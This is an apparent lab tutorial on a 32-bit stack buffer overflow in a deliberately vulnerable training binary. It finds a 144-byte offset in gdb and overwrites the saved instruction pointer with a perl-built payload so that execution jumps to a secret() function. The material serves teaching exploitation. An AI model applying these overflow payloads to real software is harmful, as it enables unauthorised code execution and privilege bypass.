# Overwrite stored instruction pointer on the stack to bypass authentication

## Intro

We will perform a simple buffer overflow on a binary. This overflow
will change the function flow, which enables us to gain "admin" privileges.

We do this by overwriting SIP (stored instruction pointer) on the stack
with the address of the `secret()` function.

## Goal

* Calling a an arbitrary function by creating a buffer overflow and overwriting SIP


## Source 

* Source directory: `~/challenges/challenge10/`
* Source files: [challenge10](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge10)

You can compile it by calling `make` in the folder `~/challenges/challenge10`

The source is identical with challenge09.


## Vulnerability

A reminder, the vulnerability lies here:

```
void handleData(char *username, char *password) {
    int isAdmin = 0;
    char name[128];
    ...
    strcpy(name, username); // strcpy() is unsafe
    ...
}

int main(int argc, char **argv) {
    handleData(argv[1], argv[2]);
}
```

The first argument of the program is copied into a stack buffer `name` of 128 byte size.

This time, the following function is also relevant:
```
void secret() {
    printf("Secret functionality\n");
}
```

## Abnormal behaviour (no debugger)

As we have seen from challenge09, we can create a segmentation fault by passing in 
an argument with size of 150 bytes:

```
~/challenges/challenge10$ ./challenge10 `perl -e 'print "A" x 150'` password
isAdmin: 0x41414141
You are admin!
Segmentation fault (core dumped)
```


## Abnormal behaviour (with debugger)

Lets do this again, but in a debugger:

```
~/challenges/challenge10$ gdb -q challenge10
Reading symbols from challenge10...
(gdb) r `perl -e 'print "A" x 150'` password
Starting program: /root/challenges/challenge10/challenge10 `perl -e 'print "A" x 150'` password
isAdmin: 0x41414141
You are admin!

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

It seems to have crashed at position `0x41414141`. That is our instruction pointer:
```
(gdb) i r eip
eip            0x41414141          0x41414141
(gdb) backtrace
#0  0x41414141 in ?? ()
#1  0xff004141 in ?? ()
#2  0xffffdeee in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```

As we can see, the value of `EIP` is `0x41414141`, or `AAAA` in ASCII.
It seems the CPU wants to continue the execution at an address which is based
on our input string (`AAAAAAAA....`). That is, we have overwritte the return
address (SIP, stored instruction pointer) on the stack, and the CPU happily
executed code at the location we point it to.

Maybe we can call the function `secret()`? We would require the following things for this:
* The address of the function `secret()`
* The location in the input string which matches the location of the SIP on the stack (offset)


## Find address of target function

We can easily find out the address of `secret()`:

```
(gdb) print &secret
$1 = (void (*)()) 0x80491f8 <secret>
```

It seems our target address is `0x80491f8`.


## Find out the offset

We will update or perl-based argument generator by appending `BBBB` at the
`AAAA`'s:

```
$ perl -e 'print "A" x 16 . "BBBB" . "\n"'
AAAAAAAAAAAAAAAABBBB
```

And adjust the offset until EIP is `0x42424242`, or `BBBB` in ASCII:

Trying with offset `142`:
```
(gdb) r `perl -e 'print "A" x 142 . "BBBB"'` password
Starting program: /root/challenges/challenge10/challenge10 `perl -e 'print "A" x 142 . "BBBB"'` password
isAdmin: 0x41414141
You are admin!

Program received signal SIGSEGV, Segmentation fault.
0x08004242 in ?? ()
```

Not quite, only two 0x42 appear! Lets try it with `144`:

```
(gdb) r `perl -e 'print "A" x 144 . "BBBB"'` password
Starting program: /root/challenges/challenge10/challenge10 `perl -e 'print "A" x 144 . "BBBB"'` password
isAdmin: 0x41414141
You are admin!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Bingo! The 4-byte value `BBBB` is now completely stored in `EIP`! Therefore
the offset to SIP (the stored instruction pointer, which gets loaded into
  EIP when executing a `ret`) is `144` bytes.

This means we can redirect the execution flow of the target program to any
address we want, by writing it at the place of the `BBBB`. For example the address of `secret()` from above.


## Write the exploit

Lets re-iterate what we know:
* The offset in the first input argument to SIP is exactly `144` bytes.
* The address of `secret()` is `0x80491f8`

The next step is to replace the `BBBB` (the SIP) with the address of `secret()`.
Note that because of the little-endianness, we have to convert the address:
* `0x80491f8` = `0xf8 0x91 0x04 0x08`

Just read it from back to front, and fill to 4 bytes (4 times 1 byte, or
  4 times two-digit hex number).

Lets update our perl argument line generator again. We can specify raw
bytes in hex by prepending them with `\x`. Or in other words, `\x41` = `A`.
```
~/challenges/challenge10$ perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"' | hexdump -v -C
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000030  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000040  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000050  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000060  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000070  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000080  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
00000090  f8 91 04 08                                       |....|
```

Not that the last few bytes (the return address) are not ASCII-printable, therefore we piped
the output into hexdump. We can see this at the last line.

Lets put it all together and try it with the vulnerable program. First in the debugger:
```
(gdb) r `perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"'` password
Starting program: /root/challenges/challenge10/challenge10 `perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"'` password
isAdmin: 0x41414141
You are admin!
Secret functionality

Program received signal SIGSEGV, Segmentation fault.
0xffffde00 in ?? ()
```

While the program still crashed, it did print the string `Secret functionality`!

Lets try it again without GDB:
```
~/challenges/challenge10$ ./challenge10 `perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"'` password
isAdmin: 0x41414141
You are admin!
Secret functionality
Segmentation fault (core dumped)
```

It printed `Secret functionality!` before
it crashed! Does that mean that the `secret()` was executed? Lets double-check
by setting a breakpoint in `secret()` and run it again in GDB:

```
(gdb) b *secret
Breakpoint 1 at 0x80491f8: file challenge10.c, line 16.

(gdb) r `perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"'` password
Starting program: /root/challenges/challenge10/challenge10 `perl -e 'print "A" x 144 . "\xf8\x91\x04\x08"'` password
isAdmin: 0x41414141
You are admin!

Breakpoint 1, secret () at challenge10.c:16
16      void secret() {
(gdb) where
#0  secret () at challenge10.c:16
#1  0xffffde00 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)
```

Indeed, breakpoint 1 was hit, and we stopped execution in `secret()`!


# Things to think about

* Why does it crash at the end?
* Can you calculate the required offset just by using GDB? (instead of brute-forcing it manually)
